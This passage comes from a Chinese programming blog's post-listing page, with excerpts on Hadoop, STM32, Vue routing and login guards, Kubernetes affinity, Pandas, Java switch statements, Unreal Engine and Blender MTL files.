block。（错误）hdfs的体系结构简要描述如何安装配置一个apache开源版本hadoop，只描述即可，无需列出完整步骤，能列出步骤更好。启动hadoop集群时报下图错误，分析什么原因：请列出hadoop的进程名称Hadoop的核心配置是什么？那当下又该如何配置？ “jps”命令的用处？杀死一个 job?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/019d648e07a81add605880a541a45c46/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dfb68222c849da20cc477504426968ab/" rel="bookmark">
			STM32学习笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
说明：
GPIO
GPIO的基本结构
GPIO框图
浮空/上拉/下拉输入
GPIO配置步骤
步骤：
常用的RCC开启始终函数
常用的GPIO函数
复位GPIO外设函数
复位AFIO外设函数
初始化GPIO口函数
给GPIO结构体变量赋一个默认值函数
GPIO的输出函数
把制定的端口设置为高电平:函数
把指定的端口设置为低电平
对根据第三个参数的值来设置电平
对GPIOx 16个端口同时进行写入操作：
GPIO的输入函数
读取输入数据寄存器某个端口的输入值，返回值是高低电平函数
读取GPIO的每一位的值，返回值是16位的数据,每一位代表一个端口值
读取输出数据寄存器的某一位
读取整个输出寄存器
程序示例
外部中断
EXTI配置步骤
复位AFIO外设
锁定GPIO配置函数
锁定引脚的配置，防止意外更改
配置AFIO的事件输出功能函数
配置引脚重映射函数
配置AFIO的数据选择器
恢复上电默认的状态函数
根据结构体配置EXTI外设函数
给传入的结构体参数赋一个默认值函数
软件触发外部中断函数
获取指定的标志位函数
对置1的标志位进行清除函数
在中断函数中获取标志位函数
清除中断挂起标志位函数
中断分组函数
根据结构体里面的参数初始化NVIC函数
设置中断向量表函数
系统低功耗配置函数
程序示例
定时器
主从触发模式
开启定时器步骤
定时器常用的库函数
恢复缺省配置函数
时基单元初始化函数
把结构体变量赋一个默认值函数
使能计数器函数
使能中断输出信号函数
选择内部时钟函数
选择ITRx其他定时器的时钟函数
选择TIx捕获通道的时钟函数
选择ETR通过外部时钟模式1输入的时钟函数
选择ETR通过外部时钟模式2输入的时钟函数
单独配置ETR引脚的预分频器、极性、滤波器这些参数的函数
单独写预分频值函数
改变计数器的计数模式函数
自动重装器预装功能配置函数
给计数器写入一个值函数
给自动重装器写入一个值函数
获取当前计数器的值函数
获取当前预分频器的值函数
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dfb68222c849da20cc477504426968ab/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e2a398129b4ee4abcbe228a8923ec989/" rel="bookmark">
			网络工程师、网络模拟器(eve-ng、gns3、packet tracert)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、网络工程师 证书 Cisco 认证 官网：https://www.cisco.com/site/cn/zh/index.html
Cisco 认证体系
翻译成中文解释如下
思科认证体系分为三个认证等级，专业水平逐级上升：工程师（CCNA）、高级工程师（CCNP）和专家（CCIE）。
CCNA考点和考试
网络基础知识网络访问IP连接性IP服务安全基础知识自动化和可编程性 CCNP 考试，必须考过 CCNA
CCIE 是企业基础架构技术专家级的认证。CCIE考点和考试
架构虚拟化基础架构网络保证安全性自动化首先，参加资格考试，即实施和运营思科企业网络核心技术（ENCOR 350-401），侧重于您对企业联网基础架构的了解。其次，参加8小时的动手实验考试，CCIE企业基础架构v1.0。这项考试涵盖复杂企业网络端到端的生命周期，从设计到部署、操作和优化。 华为认证 华为职业认证全景图：https://e.huawei.com/cn/talent/cert/#/careerCert
HCIA、HCIP、HCIE
HCIA—Huawei Certified ICT Associate：华为认证ICT工程师(HCIA)是华为认证体系中用于标识个人能力在某一技术领域达到工程师级别的证明，表示通过认证的人员具备安装、配置、运行 ICT 设备，并进行基础故障排除的能力。HCIP—Huawei Certified ICT Professional：华为认证ICT高级工程师(HCIP)是华为认证体系中用于标识个人能力在某一技术领域达到高级工程师级别的证明，表示通过认证的人员具有丰富的 ICT 知识和实践能力。HCIE—Huawei Certified ICT Expert:华为认证ICT专家(HCIE)是华为认证体系中最高级别的 ICT 技术认证，表示通过认证的人员具有 ICT 领域专业知识和丰富实践经验。 H3C 认证 官网：https://c.h3c.com/cn/
华为与华三(H3C)之间的前世今生：https://zhuanlan.zhihu.com/p/544966968
认证体系
H3C认证共分为五个级别，分别是：NA、NE、SE、TE、IE。有时又把TE和IE都划分为专家级。
H3CNA（H3C Certified Network Assistant，H3C认证网络助理工程师）定位于中小企业网络基本配置操作和设备维护，包括网络基础知识；流行网络的布线结构；网络连接方法；网络的建构；网络故障的排除；TCP/IP网络的建设；网络布线与网络互连实践；H3C设备的安装与调试。该考试没有任何的要求和条件，一般适合于中专告知类学生报考。H3CNE（H3C Certified Network Engineer，H3C认证网络工程师）认证主要定位于中小型网络的规划、设计、配置与维护，通过H3CNE认证，将证明您对数据通信网络有全面深入的了解，掌握面向中小型企业的网络通用技术，并具备设计中小企业网络以及使用H3C网络设备实施您的设计的能力。该认证可以直接报考。H3CSE Routing &amp; Switching（H3C Certified Senior Engineer for Routing &amp; Switching，H3C认证路由交换网络高级工程师）证书可以证明其持有者掌握了包括路由、交换、组播、VPN、QoS、基本安全特性等部署园区网络所需的全方位的理论知识和操作技能，可以胜任大中型复杂网络的建设和管理工作。该认证必须现有H3CNE才可以报考。 juniper 认证 "Juniper" 国内叫 "瞻博"
官网：https://www.juniper.net/cn/zh/training/certification.html
微软认证 官网：https://learn.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e2a398129b4ee4abcbe228a8923ec989/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4b60e2b3666d0b3099d513ab82be877c/" rel="bookmark">
			vite脚手架，手写实现配置动态生成路由
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		参考文档 vite的glob-import vue路由配置基本都是重复的代码，每次都写一遍挺难受，加个页面就带配置下路由
那就利用 vite 的 文件系统处理啊 先看实现效果 1. 考虑怎么约定路由，即一个文件夹下，又有组件，又有页面，怎么区分它们，这就需要提前约定好 如下：约定 以 index.vue 结尾的就是路由，其它都认为是组件， 目录结构如下, 这里我放入 views目录下
├─src ├─views	├─about ├─index.vue # 认为是页面 ├─page.ts # 对这个页面的配置，例如meta中的信息	├─home ├─index.vue ├─page.ts ├─mine ├─index.vue ├─page.ts └─other ├─info ├─index.vue ├─page.ts └─pick ├─index.vue ├─page.ts ├─index.vue ├─page.ts page.ts [ 约定为 配置文件，主要赋值给 meta 属性，它默认导出一个对象] export default { title: "关于", name: "xxx", auth: true } 2 找到views 目录下，带 page.ts 的文件，它就是你要的页面 // 获取每个页面的配置参数 [后边传参啥意思，顶部点击glob的文档] const configPage = import.meta.glob('../views/**/page.ts', { import: 'default', eager: true, }) 3 再找到以index.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4b60e2b3666d0b3099d513ab82be877c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f0a2caaf71cf513ea77cb8025fe64f6f/" rel="bookmark">
			10行代码实现vue路由最简单的登陆拦截
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		需求：不涉及任何角色权限，基本实现目标，有token就可查看任何页面，否则就去登陆，来一步步实现 1. 创建你的路由页面，此处略了 2. 导航守卫拦截判断思路 // 创建路由 const router = createRouter({ history: createWebHistory(), routes: [], }) // 开始拦截，如果是登陆页，就放行，放行后进入下一个页面 router.beforeEach((to, _, next) =&gt; { .... }) 2.1 判断当前是不是登陆页面，如果是，那么点击登陆后，就放行，即调用next()，进入下一个页面 // 开始拦截，如果是登陆页，就放行，放行后进入下一个页面 router.beforeEach((to, _, next) =&gt; { if (to.path === '/login') { next() } // 这里这么写，只是为了演示能进入下一个页面，如果不写这个， // 你点击跳转了，路由的to.path 已经变为其它的路径了， // 你是看不到下个页面的 next() }) 2.1.1 演示1，如果不写第二个next()，你会看到这个演示 可以看到 点击后，[to.path] 变成了/home, 所以判断不再走 if 了，为了能看到后边的页面，你需要next()
2.1.2 演示2，加入第二个next()，你会看到这个演示 2.2 如果不是登录页，思路就是 判断有木有 登陆过，即有木有token，如果登陆过，就放行，即next()，可以查看任何页面，如果没有登陆过，就跳转到登录页 不需要登陆，就可以看到的页面就不说了，你创建个白名单数组判断下就可以了，直接放行，这里不做演示 登陆跳转
// 点击登陆... 代码省略 // 拿到token，存起来 localStorage.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f0a2caaf71cf513ea77cb8025fe64f6f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/65f0a309e0928f956ee46af8dc9a8b26/" rel="bookmark">
			【已解决】switch语句报错Constant expression required
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		switch语句报错Constant expression required 📖问题📖原因✅解决方案方案1：if-else替换方案2：换JDK版本方案3：使用枚举替换 📖问题 📖原因 在Android Studio中使用JDK17以上版本，会出现switch语句报错"Constant expression required"的问题，这是因为在JDK17中switch语句的条件表达式支持使用枚举类型，而这个特性还没有被支持。
✅解决方案 解决方法是将switch语句的条件表达式改为使用整数类型或字符串类型，或者使用i-else语句来代替switch语句，再或者降低JDK版本，比如JDK11 LTS长期支持版本。
这里就不推荐枚举了
方案1：if-else替换 方案2：换JDK版本 因为JDK17暂时不支持这个特性，可以换成17以下版本可以，JDK8和JDK11都可以
方案3：使用枚举替换 不过这个太麻烦，不太推荐
首先，创建一个枚举类，用于表示不同的按钮。例如：
public enum ButtonType { BTN_ALERT, BTN_OTHER1, BTN_OTHER2, // 添加更多按钮类型 } 接下来，在你的Activity或Fragment中，声明一个成员变量来表示当前按钮的类型：
private ButtonType currentButtonType; 然后，将枚举类型与按钮关联起来。你可以使用Map来将按钮的资源ID与枚举类型进行映射。在Activity的onCreate方法中，或者Fragment的onCreateView方法中，进行如下操作：
Map&lt;Integer, ButtonType&gt; buttonTypeMap = new HashMap&lt;&gt;(); buttonTypeMap.put(R.id.bnt_alert, ButtonType.BTN_ALERT); buttonTypeMap.put(R.id.bnt_other1, ButtonType.BTN_OTHER1); buttonTypeMap.put(R.id.bnt_other2, ButtonType.BTN_OTHER2); // 添加更多按钮类型的映射 // 设置按钮的点击事件 findViewById(R.id.bnt_alert).setOnClickListener(v -&gt; onButtonClick(ButtonType.BTN_ALERT)); findViewById(R.id.bnt_other1).setOnClickListener(v -&gt; onButtonClick(ButtonType.BTN_OTHER1)); findViewById(R.id.bnt_other2).setOnClickListener(v -&gt; onButtonClick(ButtonType.BTN_OTHER2)); // 添加更多按钮的点击事件 最后，在你的Activity或Fragment中实现onButtonClick方法，根据枚举类型来执行相应的逻辑：
private void onButtonClick(ButtonType buttonType) { // 根据按钮类型执行相应的逻辑 switch (buttonType) { case BTN_ALERT: // 处理 BTN_ALERT 按钮点击事件 break; case BTN_OTHER1: // 处理 BTN_OTHER1 按钮点击事件 break; case BTN_OTHER2: // 处理 BTN_OTHER2 按钮点击事件 break; // 处理更多按钮类型的点击事件 } } 通过这种方式，你可以使用枚举类型来表示不同的按钮，并在点击事件中使用枚举类型，而不是直接使用资源ID,也能解决问题。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2b7a9ebc299cd05b630988c32ff4a06e/" rel="bookmark">
			持续集成部署-k8s-高级调度-亲和力
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		持续集成部署-k8s-高级调度-亲和力 1. 亲和力的基本概念2. 亲和性和非亲和性3. 节点亲和力的使用4. 节点亲和性权重5. 验证节点亲和性6. Pod 间亲和性与反亲和性7. Pod 间亲和性与反亲和性的类型8. 调度一组具有 Pod 间亲和性的 Pod9. 验证 Pod 亲和性 1. 亲和力的基本概念 在Kubernetes中，亲和力（Affinity）是一种高级调度机制，用于指定Pod如何与节点进行亲和匹配。通过亲和力规则，你可以控制Pod被调度到特定节点的方式，以便更好地满足应用程序的需求和约束条件。
亲和力规则分为两种类型：node亲和性和pod亲和性。
Node亲和性:
Node亲和性规则允许你指定Pod应该被调度到具有特定标签的节点上。这种标签可以是节点的特性、硬件配置或者地理位置等。通过使用Node亲和性，你可以确保某些Pod只被调度到符合特定要求的节点上。 Pod亲和性:
Pod亲和性规则允许你指定Pod应该与其他Pod共同部署在同一个节点上。这种规则可以确保某些相关的Pod被调度到相同的节点上，以减少网络延迟或提高局部性能。 相较于污点和容忍而言，污点和容忍更倾向于一个排除的效果，你能容忍我的污点，你就来，你不能容忍我的污点，那你就走。
接着来看下一种新的调度效果叫做亲和力。亲和力刚好跟污点容忍相反，就是配置 Pod 尽可能的到某个地方，而反亲和力刚好跟亲和力相反，就是尽可能的不到某个地方，跟污点一个效果。
污点是使用的是污点和容忍，而亲和力匹配使用的标签 Label。亲和度越高，越有可能被调度选中。
污点配合亲和力，就能够实现更细致、更复杂、更智能的调度功能。
2. 亲和性和非亲和性 nodeSelector 提供了一种最简单的方法来将 Pod 约束到具有特定标签的节点上。 亲和性和反亲和性扩展了你可以定义的约束类型。使用亲和性与反亲和性的一些好处有：
亲和性、反亲和性语言的表达能力更强。nodeSelector 只能选择拥有所有指定标签的节点。 亲和性、反亲和性为你提供对选择逻辑的更强控制能力。你可以标明某规则是“软需求”或者“偏好”，这样调度器在无法找到匹配节点时仍然调度该 Pod。你可以使用节点上（或其他拓扑域中）运行的其他 Pod 的标签来实施调度约束， 而不是只能使用节点本身的标签。这个能力让你能够定义规则允许哪些 Pod 可以被放置在一起。 亲和性功能由两种类型的亲和性组成：
节点亲和性功能类似于 nodeSelector 字段，但它的表达能力更强，并且允许你指定软规则。Pod 间亲和性/反亲和性允许你根据其他 Pod 的标签来约束 Pod。 节点亲和性概念上类似于 nodeSelector， 它使你可以根据节点上的标签来约束 Pod 可以调度到哪些节点上。 节点亲和性有两种：
requiredDuringSchedulingIgnoredDuringExecution： 调度器只有在规则被满足的时候才能执行调度。此功能类似于 nodeSelector， 但其语法表达能力更强。preferredDuringSchedulingIgnoredDuringExecution： 调度器会尝试寻找满足对应规则的节点。如果找不到匹配的节点，调度器仍然会调度该 Pod。 说明：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2b7a9ebc299cd05b630988c32ff4a06e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7286965f0fe681c91038160669a4227a/" rel="bookmark">
			《代码整洁之道》摘抄
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		《代码整洁之道：程序员的职业素养》摘抄
1 专业主义（开发人员应该怎么保证代码质量） 专业人士，就是能对自己犯下的错误负责的人，哪怕那些错误实际上在所难免。所以，雄心勃勃的专业人士们，你们要练习的第一件事就是“道歉”。道歉是必要的，但还不够。你不能一而再、再而三地犯相同的错误。职业经验多了之后，你的失误率应该快速减少，甚至渐近于零。失误率永远不可能等于零，但你有责任让它无限接近零。
发布软件时，你应该确保QA（QA：Quality Assurance (质量保证)）找不出任何问题。故意发送明知有缺陷的代码，这种做法是极其不专业的。什么样的代码是有缺陷的呢？那些你没把握的代码都是！有些家伙会把QA当作啄木鸟看待。他们把自己没有全盘检查过的代码发送过去，想等QA找出bug再反馈回来。
QA：Quality Assurance (质量保证)
QC：Quality Control (质量控制)
QM：Quality Manage (质量管理)
我是开源项目FitNesse的主要贡献者和代码提交者。在写作本书的时候，FitNesse的代码有6万多行。在这6万行代码中有2000多个单元测试，超过2.6万行。43%的代码都是测试代码。Emma的报告显示，这2000多个测试对代码的覆盖率约为90%。为什么只有90%呢？因为Emma会忽略一些执行的代码。我确信实际的覆盖率会比90%高许多。能达到100%吗？不，达不到，100%只是个理想值。但是有些代码不是很难测试吗？是的，但之所以很难测试，是因为设计时就没考虑如何测试。唯一的解决办法就是要设计易于测试的代码，最好是先写测试，再写要测的代码。
但是有些代码不是很难测试吗？是的，但之所以很难测试，是因为设计时就没考虑如何测试。唯一的解决办法就是要设计易于测试的代码，最好是先写测试，再写要测的代码。这一方法叫做测试驱动开发（TDD）
2 如何让代码质量逐步提高 每次通读代码的时候，也可以不时调整一下结构。**这一策略有时也叫“无情重构”，我把它叫作“童子军训练守则”：**对每个模块，每检入一次代码，就要让它比上次检出时变得更为简洁。每次读代码，都别忘了进行点滴的改善。这完全与大多数人对软件的理解相反。他们认为对上线运行的软件不断地做修改是危险的。错！让软件保持固定不变才是危险的！如果一直不重构代码，等到最后不得不重构时，你就会发现代码已经“僵化了”。
为什么大多数开发人员不敢不断修改他的代码呢？因为他们害怕会改坏代码！
为什么会有这样的担心呢？
因为他们没做过测试。话题又回到测试上来了。如果你有一套覆盖了全部代码的自动化测试，如果那套测试可以随时快速执行，那么你根本不会害怕修改代码。
3 保持手感，练习kata 卡塔的形式往往是一个有待解决的简单编程问题，比如编写计算拆分某个整数的素数因子等。练卡塔的目的不是找出解决方法（你已经知道方法了），而是训练你的手指和大脑。每天我都会练一两个卡塔，时间往往安排在正式投入工作之前。我可能会选用Java、Ruby、Clojure或其他我希望保持纯熟的语言来练习。我会用卡塔来培养某种专门的技能，比如让我的手指习惯点击快捷键或习惯使用某些重构技法等。不妨早晚都来个10分钟的卡塔吧，把它当作热身练习或者静心过程。
4 提升开发效率和代码质量的技巧：测试先行（测试驱动开发） “测试驱动开发”（TDD）自在行业中首次亮相，至今已经有十余年了。它最早是极限编程（XP）运动的一部分，但此后已经被Scrum和几乎所有其他敏捷方法所采纳。即使是非敏捷的团队也在实践TDD。
Kent和我坐在他的办公室里，使用Java语言解决一些小问题。我一上来就只想马上写能够解决这个小问题的代码。但是Kent不让我这么做，而是带着我一步步体验了TDD的整个过程。首先，他写了一个单元测试的一小部分，没几行代码。然后，他写了刚好能使那个测试编译通过的代码。接着，他又写了些测试，然后再写一些代码。从编码到运行的周期如此之短完全超出了我的想象。我以前都是先花上大半个小时写代码，然后才去编译或运行。而Kent居然每30秒左右就会运行一次程序。这让我目瞪口呆！
与Kent交流后我领悟到：TDD绝不仅仅是一种用于缩短编码周期的简单技巧。我会在下文中详述TDD的诸多优势。
TDD的三项法则 （1）在编好单元测试之前，不要编写任何产品代码。
（2）只要有一个单元测试失败了，就不要再写测试代码；无法通过编译也是一种失败情况。
（3）产品代码恰好能够让当前失败的单元测试成功通过即可，不要多写。
遵循这三项法则的话，大概30秒钟就要运行一次代码。先写好一个单元测试的一小部分代码，很快，你会发现还缺少一些类或函数，所以单元测试无法编译。因此必须编写产品代码，让这些测试能够编译成功。产品代码够用即可，然后再回头接着写单元测试代码。
这个循环不断反复。写一些测试代码，然后再写一些产品代码。这两套代码同步增长，互为补充。测试代码之匹配于产品代码，就如抗体之匹配于抗原一样。
好的设计 当你遵循三项法则并且做到了测试先行时，还会感到进退维谷。通常情况下，你对于想要写的代码十分清楚，但是三项法则却要求你先写出目前无法通过的单元测试，因为要测试的代码尚未诞生！这意味着必须测试将要编写的代码。测试代码的一个问题是必须隔离出待测试的代码。如果一个函数调用了其他函数，单独测试它通常会比较困难。为了编写测试，你必须找出将这个函数和其他函数解耦的办法。
换言之，测试先行的需要，会迫使你去考虑什么是好的设计。如果不先写测试，就有可能出现各个函数耦合在一起最终变成无法测试的一大团的问题。如果后面再写测试，你也许能够测试整个大块的输入和输出，但是很难测试单个函数。
“但是我可以稍后再写测试啊。”你也许会这样说。不，不可能。实际上也不是绝对不可以，没错，你是能够稍后写些测试。如果很仔细地来看，也许后写测试还可以达到较高的覆盖率。但是事后写的测试只是一种防守。而先行编写的测试则是进攻，事后编写测试的作者已经受制于已有代码，他已经知道问题是如何解决的。
与采用测试先行的方式编写的测试代码比起来，后写的测试在深度和捕获错误的灵敏度方面要逊色很多。
5 为什么产品经理的想法总是在变化 原因是观察者效应
做业务的人和写程序的人都容易陷入一个陷阱，即过早进行精细化。业务方还没有启动项目，就要精确知道最后能得到什么；开发方还没有评估整个项目，就希望精确知道要交付什么。双方都贪求不现实的精确性，而且经常愿意花大价钱来追求这种精确。
不确定原则问题在于，东西画在纸上与真正做出来，是不一样的。
业务方看到真正的运行情况时就会意识到，自己想要的根本不是这样的。一看到已经满足的需求，关于到底要什么，他们就会冒出更好的想法——通常并不是他们当时看到的样子。
在工作中，有一种现象叫观察者效应，或者不确定原则。每次你向业务方展示一项功能，他们就获得了比之前更多的信息，这些新信息反过来又会影响他们对整个系统的看法。最终结果就是，需求完成得越精细，就越容易被忽视，系统因此也谈不上完工。
6 验收测试和单元测试的区别 验收测试不是单元测试。
单元测试是程序员写给程序员的，它是正式的设计文档，描述了底层结构及代码的行为。关心单元测试结果的是程序员而不是业务人员。
验收测试是业务方写给业务方的（虽然可能最后是身为开发者的你来写）。它们是正式的需求文档，描述了业务方认为系统应该如何运行。关心验收测试结果的是业务方和程序员。有人认为区分两种测试是多此一举，所以要消灭“重复劳动”。
尽管单元测试和验收测试的对象通常是相同的，但绝对谈不上“重复”。首先，尽管两者测试的可能是同一个对象，其机制和路径却是不同的。
单元测试是深入系统内部进行，调用特定类的方法；验收测试则是在系统外部，通常是在API或者是UI级别进行。所以两者的执行路径是截然不同的。不过，这两种测试并不重复的根本理由在于，它们的主要功能其实不是测试，测试只是它们的附属职能。单元测试和验收测试首先是文档，然后才是测试。它们的主要目的是如实描述系统的设计、结构、行为。它们当然可以验证设计、结构、行为是否达到了具体指标，但是，它们的真正价值不在测试上，而在具体指标上。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c5346fd46210c27cace1ec9b3f3af0e4/" rel="bookmark">
			UE学习C&#43;&#43;（1）创建actor
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		创建新C++类 在 虚幻编辑器 中，点击 文件（File） 下拉菜单，然后选择 新建C++类...（New C++ Class...） 命令：
此时将显示 选择父类（Choose Parent Class） 菜单。可以选择要扩展的现有类，将其功能添加到自己的类。选择 Actor，因为其是可在场景中放置的最基本对象类型，然后点击 下一步（Next）。
在 为新Actor命名（Name Your New Actor） 菜单中，将Actor命名为 FloatingActor，然后点击 创建类（Create Class）。
编辑C++类 现在我们已创建C++类，将切换到Visual Studio并编辑代码。
在 Visual Studio 中，找到默认情况下显示在窗口左侧的 解决方案浏览器，然后用其找到 FloatingActor.h。在项目中，它将位于 Games&gt; QuickStart &gt; Source &gt; QuickStart 下
#pragma once #include "CoreMinimal.h" #include "GameFramework/Actor.h" #include "create_actor.generated.h" UCLASS() class SPAWNDESTROY_API Acreate_actor : public AActor { GENERATED_BODY() public:	// Sets default values for this actor's properties Acreate_actor(); protected: // Called when the game starts or when spawned virtual void BeginPlay() override; public:	// Called every frame virtual void Tick(float DeltaTime) override; public: // 静态网格体成员 UPROPERTY(VisibleAnywhere) UStaticMeshComponent* visualmesh; UPROPERTY(EditAnywhere, BlueprintReadWrite, Category = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c5346fd46210c27cace1ec9b3f3af0e4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dbb7e0bf2fec9e66279c1c29d635920c/" rel="bookmark">
			python | Pandas库数据预处理-缺失值篇：info()、isnull()、dropna()、fillna()函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		相关文章 python | Pandas库导入Excel数据（xlsx格式文件）函数：read_excel()
python | Pandas库导入csv格式文件函数：read_excel()
目录 数据源
读取数据
缺失值查找
1. info()
2. isnull()
缺失值处理方式一：删除
1. dropna()
2. dropna(how='all')
缺失值处理方式二：填充
1. fillna()
2. fillna({'a':'b'})
原数据 读取数据 import pandas as pd student = pd.read_excel(r'E:\2022Python\数据预处理.xlsx') 缺失值查找 1. info() # 使用info()函数,可以看出每列的缺失值个数。 print(student.info()) 输出结果如下：
&lt;class 'pandas.core.frame.DataFrame'&gt; RangeIndex: 9 entries, 0 to 8 Data columns (total 6 columns): # Column Non-Null Count Dtype --- ------ -------------- ----- 0 学号 8 non-null float64 1 姓名 8 non-null object 2 性别 8 non-null object 3 班级 7 non-null float64 4 入学日期 6 non-null float64 5 课程数 8 non-null float64 dtypes: float64(4), object(2) memory usage: 560.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dbb7e0bf2fec9e66279c1c29d635920c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4bc173df6cf3fc2d4e3cbb1560d732ce/" rel="bookmark">
			JAVA中switch的使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Java的switch语句是一种用于执行多个条件分支的控制结构。它允许您根据一个变量的值来选择不同的代码块执行。
下面是switch语句的基本语法：
switch (expression) { case value1: // 执行相应的代码块 break; case value2: // 执行相应的代码块 break; ... default: // 当没有匹配的case时执行的代码块 } ● expression是一个变量，它的值将与每个case语句后面的值进行比较。
● case用于指定一个值，当expression的值与该值相匹配时，相应的代码块会被执行。
● break用于结束当前case代码块的执行，并跳出switch语句。
● default是可选的，当expression的值与所有case的值都不匹配时，执行此代码块。
下面是一个使用switch语句的示例：
int day = 3; switch (day) { case 1: System.out.println("Monday"); break; case 2: System.out.println("Tuesday"); break; case 3: System.out.println("Wednesday"); break; case 4: System.out.println("Thursday"); break; case 5: System.out.println("Friday"); break; case 6: System.out.println("Saturday"); break; case 7: System.out.println("Sunday"); break; default: System.out.println("Invalid day"); } 在这个示例中，根据变量day的值，switch语句选择相应的代码块执行。在这种情况下，day的值为3，因此会执行与case 3关联的代码块，输出为"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4bc173df6cf3fc2d4e3cbb1560d732ce/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/13ff3c1a91781a44f917d6ff0e9d9f26/" rel="bookmark">
			用RVIZ2显示毫米波雷达点云
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ROS2用RVIZ2显示点云
RVIZ2支持的格式如下图
毫米波雷达和激光雷达的数据可以考虑用点云显示，也即PointCloud和PointCloud2,这里采用PointCloud。
首先查看PointCloud的消息格式，
http://docs.ros.org/en/api/sensor_msgs/html/msg/PointCloud.html
在vscode中新建工程，创建一个发布者和其定时回调函数，topic为“multi_points”
// 创建一个发布者和其定时回调函数
pub_point_data = this-&gt;create_publisher&lt;sensor_msgs::msg::PointCloud&gt;("multi_points", 10);
point_timer = this-&gt;create_wall_timer(1000ms, std::bind(&amp;MinimalPublisher::pub_point_callback, this));
使用标准的PointCloud，然后给各个参数赋值，特别注意给指针赋值时，需要按照如下模板：
// 数组的标准写入方法
geometry_msgs::msg::Point32 p;
p.x = para_data;
p.y = para_data;
p.z = 0.0f;
point_data.points.push_back(p); 然后编译运行，打开rviz2添加”/multi_points”的topic，即可看到点云的显示。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ce7c0bc31abd64c51e21209fd575097c/" rel="bookmark">
			Blender导出Mtl文件格式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一.Blender导出Mtl文件
mtl文件:为描述模型材质信息文件.
模型材质(mtl) = 着色器(shader) + 纹理(texture)
渲染3D模型时,会根据着色器提供的算法将纹理像素进行二次加工,生成结果输出至计算机渲染管线.blender提供的默认着色器为原理化BSDF,基础色选择图像纹理,选择对应的纹理图片,这样一个材质就创建好了.
文件-&gt;导出-obj文件进行导出,导出选项勾选材质组.导出mtl文件
二.Mtl文件格式
材质组为单位,材质名 + 着色器(shader)算法参数 + 纹理图片(texture)路径
Newmtl 标识材质名称
Ks 标识镜面反射颜色，颜色为rgb参考，取值0-1
Ns标识镜面反射中加权反射指数
Ka标识环境颜色，颜色为rgb参考，取值0-1
Kd标识漫反射颜色，颜色为rgb参考，取值0-1
d 和Tr 标识材质的透明度，Tr=1-d
map_ka和map_kd分别表示贴图路径
模型的材质可能会要不同的效果，为了达到这种区分，用关键字illum进行标识
Illum 0表示颜色和环境参数关闭
Illum 1表示颜色和环境参数开启
Illum 2表示材质高亮显示
Illum 3表示开启反射和光线跟踪
Illum 4表示玻璃透明度开启，管线追踪开启
三.obj文件对应材质组
在face面进行mtl关联,可指定那些面由什么材质进行渲染
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/de89e3d37331e5581910d4c2e8662bfc/" rel="bookmark">
			对Spring框架的一些总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
